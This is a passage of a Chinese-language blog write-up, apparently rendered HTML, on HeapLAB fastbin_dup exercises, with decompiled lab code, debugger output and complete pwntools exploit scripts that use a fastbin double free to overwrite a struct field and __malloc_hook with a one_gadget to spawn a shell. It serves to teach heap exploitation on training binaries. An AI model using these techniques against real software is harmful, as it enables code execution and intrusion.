class="hljs-built_in">memset</span>(m_array, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(m_array));<br>  index = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter your username: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;user_0, <span class="hljs-number">0x10</span>uLL);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1) malloc %u/%u\n&quot;</span>, index, <span class="hljs-number">7LL</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2) free&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3) target&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4) quit&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>      num = read_num();<br>      <span class="hljs-keyword">if</span> ( num != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;index: &quot;</span>);<br>      na = read_num();<br>      <span class="hljs-keyword">if</span> ( na &gt;= index )<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;invalid index&quot;</span>);<br>      <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">free</span>(m_array[na]);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\ntarget: %s\n&quot;</span>, user_0.target);<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">4</span> )<br>      &#123;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( index &gt; <span class="hljs-number">6</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;maximum requests reached&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);<br>        n = read_num();<br>        <span class="hljs-keyword">if</span> ( n &gt; <span class="hljs-number">0x78</span> )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fast chunks only (120 bytes maximum)&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          m_array[index] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(n);<br>          <span class="hljs-keyword">if</span> ( m_array[index] )<br>          &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>            read(<span class="hljs-number">0</span>, m_array[index++], n);<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;request failed&quot;</span>);<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br>pwndbg&gt; ptype user<br>type = <span class="hljs-keyword">struct</span> user &#123;<br>    <span class="hljs-type">char</span> username[<span class="hljs-number">16</span>];<br>    <span class="hljs-type">char</span> target[<span class="hljs-number">16</span>];<br>&#125;<br><span class="hljs-number">00000000</span> user struc ; (<span class="hljs-keyword">sizeof</span>=<span class="hljs-number">0x20</span>, copyof_13)   ; XREF: .data:user_0/r<br><span class="hljs-number">00000000</span> username db <span class="hljs-number">16</span> dup(?)<br><span class="hljs-number">00000010</span> target db <span class="hljs-number">16</span> dup(?)<br><span class="hljs-number">00000020</span> user ends<br><span class="hljs-number">00000020</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="思路分析-》modify"><a href="#思路分析-》modify" class="headerlink" title="思路分析-》modify"></a>思路分析-》modify</h5><ul>
+<li>观察到target在user结构体的中的target，且该结构体的大小为0x20，使用开始的username的输入构造一个虚假的size字段。</li>
+<li>进行fastbin dup，将fd改为user结构体的位置。</li>
+<li>修改target</li>
+</ul>
+<h5 id="漏洞利用-》modify"><a href="#漏洞利用-》modify" class="headerlink" title="漏洞利用-》modify"></a>漏洞利用-》modify</h5><ul>
+<li><p>fastbin dup </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br></code></pre></td></tr></table></figure>
+
+<p><img src="Heap.assets/image-20220820173211603.png" srcset="/img/loading.gif" lazyload alt="image-20220820173211603"></p>
+</li>
+<li><p>修改fd指针</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># modify fd</span><br>chunk_1 = malloc(<span class="hljs-number">0x28</span>, p64(elf.sym.user))<br></code></pre></td></tr></table></figure>
+
+<p><img src="Heap.assets/image-20220820173412011.png" srcset="/img/loading.gif" lazyload alt="image-20220820173412011"></p>
+</li>
+<li><p>malloc twice</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># malloc_twice</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="Heap.assets/image-20220820174021017.png" srcset="/img/loading.gif" lazyload alt="image-20220820174021017"></p>
+</li>
+<li><p>malloc fake chunk</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># malloc the fake chunk</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;win !&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>但此时由于我们之前并没有设置虚假的size字段，所以会出现一个中断。如果我们设置了那个虚假的字段，便修改完成</p>
+<p><img src="Heap.assets/image-20220820174213853.png" srcset="/img/loading.gif" lazyload alt="image-20220820174213853"></p>
+</li>
+<li><p>success</p>
+<p><img src="Heap.assets/image-20220820175408919.png" srcset="/img/loading.gif" lazyload alt="image-20220820175408919"></p>
+</li>
+</ul>
+<h5 id="exp-》modify"><a href="#exp-》modify" class="headerlink" title="exp-》modify"></a>exp-》modify</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;fastbin_dup&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size &amp; data.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size, data</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># Set the username field.</span><br>username = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>)<br>io.sendafter(<span class="hljs-string">b&quot;username: &quot;</span>, username)<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Request two 0x30-sized chunks and fill them with data.</span><br>chunk_A = malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span>)<br>chunk_B = malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x28</span>)<br><br><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br><br><span class="hljs-comment"># modify fd</span><br>chunk_1 = malloc(<span class="hljs-number">0x28</span>, p64(elf.sym.user))<br><br><span class="hljs-comment"># malloc_twice</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br><br><span class="hljs-comment"># malloc the fake chunk</span><br>malloc(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&quot;win !&quot;</span>)<br><span class="hljs-comment"># =============================================================================</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h5 id="思路分析-》drop-shell"><a href="#思路分析-》drop-shell" class="headerlink" title="思路分析-》drop shell"></a>思路分析-》drop shell</h5><ul>
+<li>fastbin dup</li>
+<li>__malloc_hook -&gt; one_gadget</li>
+</ul>
+<h5 id="漏洞利用-》drop-shell"><a href="#漏洞利用-》drop-shell" class="headerlink" title="漏洞利用-》drop shell"></a>漏洞利用-》drop shell</h5><ul>
+<li><p>虚假字段的大小为0x7f -&gt; 意味着我们要申请0x68的chunk。然后fastbin dup 将其fd修改至__malloc_hook - 35 的位置。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Request two 0x30-sized chunks and fill them with data.</span><br>chunk_A = malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span>)<br>chunk_B = malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x28</span>)<br><br><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br><br><span class="hljs-comment"># modify fd</span><br>malloc(<span class="hljs-number">0x68</span>, p64(libc.sym.__malloc_hook - <span class="hljs-number">35</span>))<br></code></pre></td></tr></table></figure></li>
+<li><p>填充0x13的垃圾数据，接着填入one_gadget的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># malloc twice</span><br>malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-comment"># malloc fake chunk</span><br><span class="hljs-comment"># if no limit malloc&#x27;s count</span><br><span class="hljs-comment"># malloc(0x68, p8(0)*0x13+p64(libc.sym.system))</span><br><span class="hljs-comment"># sh_addr = p64(next(libc.search(b&#x27;/bin/sh\x00&#x27;)))</span><br><br><span class="hljs-comment"># malloc(sh_addr, b&quot;&quot;)</span><br>one = [<span class="hljs-number">0xc4dbf</span>, <span class="hljs-number">0xc4de6</span>, <span class="hljs-number">0xe1fa1</span>]<br>malloc(<span class="hljs-number">0x68</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">0x13</span>+p64(libc.address + one[<span class="hljs-number">2</span>]))<br>malloc(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure></li>
+<li><p>drop shell</p>
+<p><img src="Heap.assets/image-20220820184826255.png" srcset="/img/loading.gif" lazyload alt="image-20220820184826255"></p>
+</li>
+</ul>
+<h5 id="exp-》drop-shell"><a href="#exp-》drop-shell" class="headerlink" title="exp-》drop shell"></a>exp-》drop shell</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;fastbin_dup&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option; send size &amp; data.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size, data</span>):<br>    <span class="hljs-keyword">global</span> index<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;size: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;size&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># =-=-=- EXAMPLE -=-=-=</span><br><br><span class="hljs-comment"># Set the username field.</span><br>username = <span class="hljs-string">b&quot;ferity-fan&quot;</span><br>io.sendafter(<span class="hljs-string">b&quot;username: &quot;</span>, username)<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Request two 0x30-sized chunks and fill them with data.</span><br>chunk_A = malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x28</span>)<br>chunk_B = malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x28</span>)<br><br><span class="hljs-comment"># Free the first chunk, then the second.</span><br>free(chunk_A)<br>free(chunk_B)<br>free(chunk_A)<br><br><span class="hljs-comment"># modify fd</span><br>malloc(<span class="hljs-number">0x68</span>, p64(libc.sym.__malloc_hook - <span class="hljs-number">35</span>))<br><br><span class="hljs-comment"># malloc twice</span><br>malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>malloc(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-comment"># malloc fake chunk</span><br><span class="hljs-comment"># if no limit malloc&#x27;s count</span><br><span class="hljs-comment"># malloc(0x68, p8(0)*0x13+p64(libc.sym.system))</span><br><span class="hljs-comment"># sh_addr = p64(next(libc.search(b&#x27;/bin/sh\x00&#x27;)))</span><br><br><span class="hljs-comment"># malloc(sh_addr, b&quot;&quot;)</span><br>one = [<span class="hljs-number">0xc4dbf</span>, <span class="hljs-number">0xc4de6</span>, <span class="hljs-number">0xe1fa1</span>]<br>malloc(<span class="hljs-number">0x68</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">0x13</span>+p64(libc.address + one[<span class="hljs-number">2</span>]))<br>malloc(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br><span class="hljs-comment"># =============================================================================</span><br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="示例二：fastbin-dup-2"><a href="#示例二：fastbin-dup-2" class="headerlink" title="示例二：fastbin_dup_2"></a>示例二：fastbin_dup_2</h4><blockquote>
+<p>文件详见附件 <a href="attachment/fastbin_dup_2/fastbin_dup_2">fastbin_dup_2</a></p>
+</blockquote>
+<h5 id="检查安全措施-3"><a href="#检查安全措施-3" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/challenge-fastbin_dup]<br>└─$ checksec fastbin_dup_2 <br>[*] <span class="hljs-string">&#x27;/home/fanya/Desktop/heap/heaplab/part1/challenge-fastbin_dup/fastbin_dup_2&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>    RUNPATH:  <span class="hljs-string">&#x27;../.glibc/glibc_2.30_no-tcache&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h5><p>没有限制double free，但此时的chunk申请不了0x68的大小也就意味着我们不能直接利用那个<code>__malloc_hook - 35</code>的位置了。但是我们知道<code>main_arena</code>上存着各种fastbin的fd指针，可以使用两次fastbin dup，一次用来写 size字段，一次用来写fd字段，此时的fd字段是main_arena上的某个位置（要与伪造的size相对应），接着malloc来覆盖至top_chunk的地址，修改至<code>__malloc_hook - 35 </code>的位置，此时继续malloc适当的大小即可覆盖至<code>__malloc_hook</code>，将其覆盖为one_gadget的地址。但是我们发现此时的寄存器状态并不满足任何一个one_gadget所需要的条件，不过经我们调试发现相应的位置存着是我们之前输入的值，将其修改为<code>-s\x00</code>即可。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 num; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index; <span class="hljs-comment">// [rsp+14h] [rbp-7Ch]</span><br>  <span class="hljs-type">size_t</span> n; <span class="hljs-comment">// [rsp+18h] [rbp-78h]</span><br>  <span class="hljs-type">unsigned</span> __int64 na; <span class="hljs-comment">// [rsp+18h] [rbp-78h]</span><br>  <span class="hljs-type">char</span> *m_array[<span class="hljs-number">13</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+88h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n===============&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;|   HeapLAB   |  CHALLENGE: Fastbin Dup&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;===============\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;puts() @ %p\n&quot;</span>, &amp;<span class="hljs-built_in">puts</span>);<br>  <span class="hljs-built_in">memset</span>(m_array, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(m_array));<br>  index = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1) malloc %u/%u\n&quot;</span>, index, <span class="hljs-number">13LL</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2) free&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3) quit&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>      num = read_num();<br>      <span class="hljs-keyword">if</span> ( num != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;index: &quot;</span>);<br>      na = read_num();<br>      <span class="hljs-keyword">if</span> ( na &gt;= index )<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;invalid index&quot;</span>);<br>      <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">free</span>(m_array[na]);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">3</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( num == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( index &gt; <span class="hljs-number">0xC</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;maximum requests reached&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);<br>        n = read_num();<br>        <span class="hljs-keyword">if</span> ( n &gt; <span 